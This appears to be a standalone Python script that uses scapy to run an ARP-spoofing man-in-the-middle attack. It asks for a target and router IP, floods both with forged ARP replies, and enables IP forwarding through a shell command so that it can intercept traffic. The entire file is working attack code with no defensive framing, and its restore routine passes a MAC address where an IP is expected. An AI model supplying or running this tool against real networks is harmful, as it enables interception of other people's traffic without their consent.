# 192.168.170.131
import scapy.all as scapy
import time
import subprocess

target_ip = ""
router_ip = ""


# Return mac address of given ip address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast =  broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


# Create and send arp spoofing packet to the targeted machine
def spoof(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    scapy.send(packet, verbose=False)

    # Enable Port forwarding
    command = "echo 1 > /proc/sys/net/ipv4/ip_forward"
    subprocess.run(command, shell=True, check=True)


# Restore machine to its normal state after arp spoofing attack
def restore(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    packet = scapy.ARP(op=2, pdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    scapy.send(packet, count=4, verbose=False)
    
    # Disable Port forwarding
    command = "echo 0 > /proc/sys/net/ipv4/ip_forward"
    subprocess.run(command, shell=True, check=True)


# Main funtion to control the exuction of other functions
def start_spoof():
    global target_ip
    global router_ip
    target_ip =  input("Enter target ip: ")
    router_ip = input("Enter router ip address: ")

    set_packet_count = 0 
    try:
        while True:
            spoof(str(target_ip), str(router_ip))
            spoof(str(router_ip), str(target_ip))
            set_packet_count += 2
            print(f"\r[+] Packet sent: {str(set_packet_count)}", end="")
            time.sleep(2)
        print("\n")
    except KeyboardInterrupt:
        print("\nStopping...")
        restore(target_ip, router_ip)
    except PermissionError:
        print("Run the program as root")
